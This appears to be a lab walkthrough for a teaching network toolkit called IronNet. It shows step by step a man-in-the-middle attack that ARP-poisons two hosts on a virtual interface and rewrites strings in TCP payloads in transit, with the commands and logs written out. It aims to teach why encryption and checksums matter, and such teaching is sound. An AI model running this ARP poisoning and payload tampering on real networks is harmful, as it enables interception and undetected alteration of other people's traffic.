# Demo 25: MITM Traffic Modification — In-Transit Data Alteration

## Prerequisites

- WSL 2 with Ubuntu
- IronNet built: `cd IronNet/build && cmake ../src -DCMAKE_BUILD_TYPE=Debug && make`
- Three terminal windows

## What this demo shows

- The `--modify` option replaces matching patterns in packet payloads in transit
- Demonstrates data integrity attacks — attacker silently alters data
- Shows why encryption (TLS/IPsec) is essential

## Terminal 1: Start router

```bash
cd IronNet/build
sudo ./ironstack/ironstack ../src/configs/router.conf
```

## Terminal 2: Setup client

```bash
sudo ip addr add 10.0.1.2/24 dev iron0
sudo ip link set iron0 up
```

## Terminal 3: Start MITM with modification rules

```bash
cd IronNet/build
sudo ./ironattack/ironmitm --victim-a 10.0.1.1 --victim-b 10.0.1.2 --iface iron0 \
    --modify "secret:XXXXXX" --modify "hello:PWNED" --log /tmp/mitm_modify.log
```

Expected startup:
```
  Victim A: 10.0.1.1
  Victim B: 10.0.1.2
  Modify:   2 rules
    [1] "secret" -> "XXXXXX"
    [2] "hello" -> "PWNED"

  [mitm] Starting ARP poisoning + relay...
```

## Terminal 2: Send data containing the patterns

```bash
echo "secret" | nc -w2 10.0.1.1 7
echo "hello world" | nc -w2 10.0.1.1 7
echo "normal data" | nc -w2 10.0.1.1 7
```

## Terminal 3: MITM shows modifications

```
  [A->B] 10.0.1.1:7 -> 10.0.1.2:49700 TCP (47 bytes)
  [MODIFY] Replaced "secret" with "XXXXXX" at offset 54
  [A->B] 10.0.1.1:7 -> 10.0.1.2:49701 TCP (51 bytes)
  [MODIFY] Replaced "hello" with "PWNED" at offset 54
  [A->B] 10.0.1.1:7 -> 10.0.1.2:49702 TCP (51 bytes)
```

## Terminal 3: Stop MITM (Ctrl+C)

```
^C
  [mitm] Modification rules:
    "secret" -> "XXXXXX": 1 hits
    "hello" -> "PWNED": 1 hits
```

## Modification rules

| Rule format | Example | Effect |
|-------------|---------|--------|
| `find:replace` | `"secret:XXXXXX"` | Replace "secret" with "XXXXXX" in payload |
| Multiple rules | `--modify "OK:NO" --modify "bar:XXX"` | Apply all rules to each packet |

**Constraints:**
- Find and replace must be the **same length** (in-place replacement)
- Only searches payload after headers (offset 54+)
- Up to 8 rules maximum

## What this demonstrates

- **Data integrity attack**: attacker silently alters data in transit
- **Why encryption matters**: with TLS/IPsec, payload is encrypted — attacker can't find patterns
- **Why checksums matter**: TCP checksum mismatch would detect modification
